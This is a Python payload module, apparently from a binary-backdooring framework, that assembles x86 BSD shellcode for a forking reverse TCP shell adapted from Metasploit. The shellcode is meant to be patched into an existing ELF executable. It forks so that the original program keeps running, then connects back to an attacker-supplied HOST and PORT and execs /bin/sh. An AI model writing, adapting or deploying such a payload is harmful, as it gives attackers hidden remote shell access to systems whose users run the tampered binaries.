import struct
import os
import logging
from core import support
logger = logging.getLogger(__name__)
#eat_code_caves function is arch agnostic?
from common import common

class fork_reverse_shell_tcp():

    def __init__(self):
        #could take this out HOST/PORT and put into each shellcode function
        #self.HOST = HOST
        #self.PORT = PORT
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "fork_reverse_shell_tcp"
        self.description = """Basic reverse_shell_tcp (non-stager) from metasploit"""
        self.requirements = {'MODE':'How the patching will happen',
                             'HOST':'<HOST to connect back to>',
                             'PORT':'<Port to connect back to>',
                             'ENCODER': '<Encoder you want to use, else none>'
                            }
        self.supported_modes = ['text_splitting']
        self.shellcode = ""
        self.apis_needed = None
        self.payload_type = 'single'

        
    def invoke(self, PM):
        # Expose patching method objects
        
        self.PM = PM
        # Expose BDF method objects
        self.BDF = self.PM.BDF
        logger.debug(f"IN PAYLOAD DEBUG: {dir(self)}")
        if support.support(self).check_reqs() is False:
            return False
        
        return self.run()

    def run(self): 
        

        """
        Modified metasploit payload/bsd/x86/shell_reverse_tcp
        to correctly fork the shellcode payload and contiue normal execution.
        """
       

        self.shellcode = b"\x52"        # push edx
        self.shellcode += b"\x31\xC0"   # xor eax, eax
        self.shellcode += b"\xB0\x02"   # mov al, 2
        self.shellcode += b"\xCD\x80"   # int 80
        self.shellcode += b"\x5A"       # pop edx
        self.shellcode += b"\x85\xc0\x74\x07"
        self.shellcode += b"\xbd"
        #JMP to e_entry
        self.shellcode += struct.pack("<I", self.PM.BDF.elf_object['e_entry'])
        self.shellcode += b"\xff\xe5"
        #BEGIN EXTERNAL SHELLCODE
        self.shellcode += b"\x68"
        self.shellcode += common.pack_ip_addresses(self.HOST)
        self.shellcode += b"\x68\xff\x02"
        self.shellcode += struct.pack('!H', int(self.PORT))
        self.shellcode += bytes("\x89\xe7\x31\xc0\x50"
                            "\x6a\x01\x6a\x02\x6a\x10\xb0\x61\xcd\x80\x57\x50\x50\x6a\x62"
                            "\x58\xcd\x80\x50\x6a\x5a\x58\xcd\x80\xff\x4f\xe8\x79\xf6\x68"
                            "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50"
                            "\xb0\x3b\xcd\x80", 'iso-8859-1')
        return self.shellcode
